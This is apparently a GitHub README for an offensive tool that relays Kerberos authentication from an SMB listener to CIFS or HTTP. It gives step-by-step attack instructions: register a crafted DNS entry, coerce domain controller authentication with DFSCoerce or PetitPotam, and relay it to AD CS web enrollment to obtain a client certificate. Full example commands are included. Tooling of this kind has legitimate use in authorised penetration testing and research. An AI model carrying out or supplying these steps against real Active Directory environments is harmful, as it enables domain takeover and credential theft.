# KrbRelay-SMBServer

This krbrelay version acts as an SMB server (instead of DCOM) to relay Kerberos AP-REQ to CIFS or HTTP. <br>
It's 90% based on @cube0x0's KrbRelay:  https://github.com/cube0x0/KrbRelay<br><br>
To control the SPN for relaying, James Forshaw's *CredMarshalTargetInfo()* trick is required: https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html<br><br>

Create a DNS entry for the target server as *<server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA* mapped to your listener/relay IP. <br>
Domain users can typically perform secure DNS updates, for example you can use powershell script *invoke-dnsupdate* (https://github.com/Kevin-Robertson/Powermad) for adding a DNS entry<br><br>

Trigger the SMB authentication with a third-party tool, for example  DFSCoerce https://github.com/Wh04m1001/DFSCoerce,  PetitPotam https://github.com/topotam/PetitPotam , etc... and relay it to the attacker machine.<br><br>
Given that SMB port is 445 you have two options on the Windows attacker machine:<br>
* use a Linux box acting as redirector
* disable the SERVER serice on your Windows machine
<br><br>


This is a quick & dirty adaptation from original project, leaving cleanup and optimization to you  ;)
<br>
### Examples

````
# Relay the DC SMB authentication to HTTP (ADCS) web enrollment and request client certificate using a linux box redirecting to windows attacker machine on port 9999:<br>
krbRelay.exe -spn http/adcs-mylab.mylab.local -redirecthost adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -endpoint certsrv  -adcs DomainController -listenerport 9999<br>
In another window:
DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
(https://github.com/decoder-it/DFSCoerce-exe-2)

# special command line switches:
-listener: relay listener port
-redirector: relay server/redirector  mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
For detailed usage and command line switches refer to original krbrelay tool
````

<img width="1036" alt="Screenshot 2024-10-04 135731" src="https://github.com/user-attachments/assets/e2f95aa4-6c94-4517-b6c8-d7629a19a9f4">
<img width="1001" alt="Screenshot 2024-10-04 141231" src="https://github.com/user-attachments/assets/fd7bb972-0942-48d9-b99b-ba623f2823b0">
